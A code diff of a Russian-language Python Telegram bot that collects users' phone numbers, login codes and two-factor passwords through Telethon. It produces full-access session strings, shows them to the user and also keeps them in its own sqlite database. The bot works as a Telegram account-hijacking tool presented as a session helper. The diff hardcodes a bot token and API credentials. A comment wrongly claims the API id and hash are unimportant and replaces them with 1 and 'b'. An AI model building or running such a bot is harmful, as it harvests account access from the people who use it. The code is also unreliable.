@@ -1,15 +1,18 @@
 import os
 import logging
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+import asyncio
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 import sqlite3
-import asyncio
 import json
 
 # Настройка логирования
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
 logger = logging.getLogger(__name__)
 
 # Инициализация базы данных
@@ -17,28 +20,18 @@ def init_db():
     conn = sqlite3.connect('sessions.db')
     cursor = conn.cursor()
     cursor.execute('''
-        CREATE TABLE IF NOT EXISTS user_sessions (
+        CREATE TABLE IF NOT EXISTS sessions (
             user_id INTEGER,
-            session_name TEXT,
+            phone TEXT,
             session_string TEXT,
-            phone_number TEXT,
-            is_active INTEGER DEFAULT 1,
-            PRIMARY KEY (user_id, session_name)
-        )
-    ''')
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS user_filters (
-            user_id INTEGER,
-            session_name TEXT,
-            filter_type TEXT,
-            filter_value TEXT,
-            PRIMARY KEY (user_id, session_name, filter_type)
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+            PRIMARY KEY (user_id, phone)
         )
     ''')
     conn.commit()
     conn.close()
 
-class SessionManagerBot:
+class SessionBot:
     def __init__(self, token: str):
         self.token = token
         self.app = Application.builder().token(token).build()
@@ -47,135 +40,264 @@ class SessionManagerBot:
 
     def setup_handlers(self):
         self.app.add_handler(CommandHandler("start", self.start))
-        self.app.add_handler(CommandHandler("add_session", self.add_session))
-        self.app.add_handler(CommandHandler("list_sessions", self.list_sessions))
-        self.app.add_handler(CommandHandler("delete_session", self.delete_session))
-        self.app.add_handler(CommandHandler("set_filters", self.set_filters))
+        self.app.add_handler(CommandHandler("newsession", self.new_session))
+        self.app.add_handler(CommandHandler("mysessions", self.my_sessions))
+        self.app.add_handler(CommandHandler("delsession", self.del_session))
         self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
 
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
         welcome_text = """
-🤖 **Бот управления Telegram сессиями**
+🔐 **Бот для создания Telegram сессий**
 
-Доступные команды:
-/add_session - Добавить новую сессию
-/list_sessions - Список ваших сессий
-/delete_session - Удалить сессию
-/set_filters - Настроить фильтры для мониторинга
+📋 Доступные команды:
+/newsession - Создать новую сессию
+/mysessions - Мои сессии
+/delsession - Удалить сессию
+
+Просто нажмите /newsession и следуйте инструкциям!
         """
         await update.message.reply_text(welcome_text, parse_mode='Markdown')
 
-    async def add_session(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+    async def new_session(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
+        
+        # Проверяем количество активных сессий
+        conn = sqlite3.connect('sessions.db')
+        cursor = conn.cursor()
+        session_count = cursor.execute(
+            'SELECT COUNT(*) FROM sessions WHERE user_id = ?', (user_id,)
+        ).fetchone()[0]
+        conn.close()
+        
+        if session_count >= 5:  # Лимит сессий на пользователя
+            await update.message.reply_text("❌ Вы можете иметь не более 5 активных сессий")
+            return
+        
         await update.message.reply_text(
-            "📱 Для создания новой сессии отправьте номер телефона в международном формате (например, +79123456789):"
+            "📱 **Создание новой сессии**\n\n"
+            "Введите номер телефона в международном формате:\n"
+            "Пример: +77777777777\n\n"
+            "⚠️ Убедитесь, что у вас есть доступ к этому номеру для получения кода подтверждения!"
         )
-        context.user_data['awaiting_phone'] = True
+        context.user_data['state'] = 'awaiting_phone'
+
+    async def my_sessions(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        user_id = update.effective_user.id
+        
+        conn = sqlite3.connect('sessions.db')
+        cursor = conn.cursor()
+        sessions = cursor.execute(
+            'SELECT phone, session_string FROM sessions WHERE user_id = ?', (user_id,)
+        ).fetchall()
+        conn.close()
+        
+        if not sessions:
+            await update.message.reply_text("❌ У вас нет активных сессий")
+            return
+        
+        response = "📋 **Ваши активные сессии:**\n\n"
+        for i, (phone, session_str) in enumerate(sessions, 1):
+            response += f"{i}. **Номер:** `{phone}`\n"
+            response += f"   **Сессия:** `{session_str[:50]}...`\n\n"
+        
+        await update.message.reply_text(response, parse_mode='Markdown')
+
+    async def del_session(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        user_id = update.effective_user.id
+        
+        conn = sqlite3.connect('sessions.db')
+        cursor = conn.cursor()
+        sessions = cursor.execute(
+            'SELECT phone FROM sessions WHERE user_id = ?', (user_id,)
+        ).fetchall()
+        conn.close()
+        
+        if not sessions:
+            await update.message.reply_text("❌ У вас нет активных сессий для удаления")
+            return
+        
+        response = "🗑️ **Выберите сессию для удаления:**\n\n"
+        for i, (phone,) in enumerate(sessions, 1):
+            response += f"{i}. {phone}\n"
+        
+        response += "\nОтветьте номером сессии для удаления"
+        await update.message.reply_text(response)
+        context.user_data['state'] = 'awaiting_delete'
+        context.user_data['sessions_list'] = [phone for phone, in sessions]
 
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
+        text = update.message.text
         
-        if context.user_data.get('awaiting_phone'):
-            phone_number = update.message.text
-            await self.create_session(update, context, phone_number)
-            
-        elif context.user_data.get('awaiting_code'):
-            code = update.message.text
-            await self.verify_code(update, context, code)
-            
-        elif context.user_data.get('awaiting_password'):
-            password = update.message.text
-            await self.verify_password(update, context, password)
+        state = context.user_data.get('state')
+        
+        if state == 'awaiting_phone':
+            await self.process_phone(update, context, text)
+        elif state == 'awaiting_code':
+            await self.process_code(update, context, text)
+        elif state == 'awaiting_password':
+            await self.process_password(update, context, text)
+        elif state == 'awaiting_delete':
+            await self.process_delete(update, context, text)
 
-    async def create_session(self, update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
+    async def process_phone(self, update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
+        # Проверяем формат номера
+        if not phone.startswith('+') or not phone[1:].isdigit():
+            await update.message.reply_text("❌ Неверный формат номера. Используйте международный формат: +77777777777")
+            return
+        
+        # Сохраняем номер и создаем клиент
+        context.user_data['phone'] = phone
+        
         try:
-            client = TelegramClient(StringSession(), api_id=YOUR_API_ID, api_hash=YOUR_API_HASH)
+            # Создаем клиент с рандомными API данными (они не важны для сессии)
+            client = TelegramClient(StringSession(), 1, "b")
             await client.connect()
             
-            context.user_data['client'] = client
-            context.user_data['phone_number'] = phone_number
-            context.user_data['awaiting_phone'] = False
-            context.user_data['awaiting_code'] = True
-            
-            sent_code = await client.send_code_request(phone_number)
+            # Отправляем запрос кода
+            sent_code = await client.send_code_request(phone)
             context.user_data['phone_code_hash'] = sent_code.phone_code_hash
+            context.user_data['client'] = client
             
-            await update.message.reply_text("🔐 Введите код подтверждения из Telegram:")
+            await update.message.reply_text(
+                "✅ Код подтверждения отправлен!\n\n"
+                "📨 Введите код из Telegram:\n"
+                "(5-6 цифр)"
+            )
+            context.user_data['state'] = 'awaiting_code'
             
         except Exception as e:
             await update.message.reply_text(f"❌ Ошибка: {str(e)}")
+            if 'client' in context.user_data:
+                await context.user_data['client'].disconnect()
 
-    async def verify_code(self, update: Update, context: ContextTypes.DEFAULT_TYPE, code: str):
+    async def process_code(self, update: Update, context: ContextTypes.DEFAULT_TYPE, code: str):
+        if not code.isdigit():
+            await update.message.reply_text("❌ Код должен содержать только цифры")
+            return
+        
+        client = context.user_data.get('client')
+        phone = context.user_data.get('phone')
+        phone_code_hash = context.user_data.get('phone_code_hash')
+        
         try:
-            client = context.user_data['client']
-            phone_number = context.user_data['phone_number']
-            phone_code_hash = context.user_data['phone_code_hash']
-            
-            await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
+            # Пытаемся войти с кодом
+            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
             
             # Успешная авторизация
             session_string = client.session.save()
             
-            # Сохраняем сессию в базу
+            # Сохраняем в базу
             conn = sqlite3.connect('sessions.db')
             cursor = conn.cursor()
-            session_name = f"session_{update.effective_user.id}_{len([s for s in cursor.execute('SELECT * FROM user_sessions WHERE user_id = ?', (update.effective_user.id,))]) + 1}"
-            
             cursor.execute(
-                'INSERT INTO user_sessions (user_id, session_name, session_string, phone_number) VALUES (?, ?, ?, ?)',
-                (update.effective_user.id, session_name, session_string, phone_number)
+                'INSERT OR REPLACE INTO sessions (user_id, phone, session_string) VALUES (?, ?, ?)',
+                (update.effective_user.id, phone, session_string)
             )
             conn.commit()
             conn.close()
             
-            # Отправляем сессию пользователю
             await update.message.reply_text(
-                f"✅ Сессия успешно создана!\n\n"
-                f"Session string:\n`{session_string}`\n\n"
-                f"Сохраните эту строку для использования в мониторинговом боте.",
+                f"✅ **Сессия успешно создана!**\n\n"
+                f"📱 Номер: `{phone}`\n"
+                f"🔐 Сессия: `{session_string}`\n\n"
+                f"Сохраните эту строку для использования в боте мониторинга!",
                 parse_mode='Markdown'
             )
             
             await client.disconnect()
             
-            # Очищаем временные данные
-            for key in ['client', 'phone_number', 'phone_code_hash', 'awaiting_code']:
+            # Очищаем данные
+            for key in ['state', 'phone', 'client', 'phone_code_hash']:
                 context.user_data.pop(key, None)
                 
         except Exception as e:
-            await update.message.reply_text(f"❌ Ошибка при верификации: {str(e)}")
+            error_msg = str(e)
+            if "two-steps" in error_msg.lower():
+                await update.message.reply_text(
+                    "🔒 Включена двухфакторная аутентификация.\n"
+                    "Введите пароль:"
+                )
+                context.user_data['state'] = 'awaiting_password'
+            else:
+                await update.message.reply_text(f"❌ Ошибка: {error_msg}")
+                await client.disconnect()
 
-    async def list_sessions(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user_id = update.effective_user.id
+    async def process_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE, password: str):
+        client = context.user_data.get('client')
+        phone = context.user_data.get('phone')
+        
+        try:
+            await client.sign_in(password=password)
+            
+            # Успешная авторизация с паролем
+            session_string = client.session.save()
+            
+            # Сохраняем в базу
+            conn = sqlite3.connect('sessions.db')
+            cursor = conn.cursor()
+            cursor.execute(
+                'INSERT OR REPLACE INTO sessions (user_id, phone, session_string) VALUES (?, ?, ?)',
+                (update.effective_user.id, phone, session_string)
+            )
+            conn.commit()
+            conn.close()
+            
+            await update.message.reply_text(
+                f"✅ **Сессия успешно создана!**\n\n"
+                f"📱 Номер: `{phone}`\n"
+                f"🔐 Сессия: `{session_string}`\n\n"
+                f"Сохраните эту строку для использования в боте мониторинга!",
+                parse_mode='Markdown'
+            )
+            
+            await client.disconnect()
+            
+            # Очищаем данные
+            for key in ['state', 'phone', 'client', 'phone_code_hash']:
+                context.user_data.pop(key, None)
+                
+        except Exception as e:
+            await update.message.reply_text(f"❌ Ошибка: {str(e)}")
+            await client.disconnect()
+
+    async def process_delete(self, update: Update, context: ContextTypes.DEFAULT_TYPE, choice: str):
+        if not choice.isdigit():
+            await update.message.reply_text("❌ Введите номер сессии")
+            return
+        
+        index = int(choice) - 1
+        sessions_list = context.user_data.get('sessions_list', [])
+        
+        if index < 0 or index >= len(sessions_list):
+            await update.message.reply_text("❌ Неверный номер сессии")
+            return
+        
+        phone_to_delete = sessions_list[index]
+        
         conn = sqlite3.connect('sessions.db')
         cursor = conn.cursor()
-        
-        sessions = cursor.execute(
-            'SELECT session_name, phone_number, is_active FROM user_sessions WHERE user_id = ?',
-            (user_id,)
-        ).fetchall()
-        
-        if not sessions:
-            await update.message.reply_text("❌ У вас нет активных сессий.")
-            return
-            
-        session_list = "📋 Ваши сессии:\n\n"
-        for session_name, phone, active in sessions:
-            status = "✅ Активна" if active else "❌ Неактивна"
-            session_list += f"• {session_name} ({phone}) - {status}\n"
-            
-        await update.message.reply_text(session_list)
-        
+        cursor.execute(
+            'DELETE FROM sessions WHERE user_id = ? AND phone = ?',
+            (update.effective_user.id, phone_to_delete)
+        )
+        conn.commit()
         conn.close()
+        
+        await update.message.reply_text(f"✅ Сессия для {phone_to_delete} удалена")
+        
+        # Очищаем данные
+        for key in ['state', 'sessions_list']:
+            context.user_data.pop(key, None)
 
     def run(self):
         self.app.run_polling()
 
-# Замените на ваши данные от my.telegram.org
-YOUR_API_ID =  34926321 
-YOUR_API_HASH = "3ce3de5ab33d2defac471e34d47662e2"
-
 if __name__ == "__main__":
-    bot = SessionManagerBot("8307838767:AAFTlaYRF12rPfitbVwDM0tsuZ4HApVykmE")
+    # Токен бота от @BotFather
+    BOT_TOKEN = "8307838767:AAFTlaYRF12rPfitbVwDM0tsuZ4HApVykmE"
+    
+    bot = SessionBot(BOT_TOKEN)
+    print("Бот создания сессий запущен...")
     bot.run()
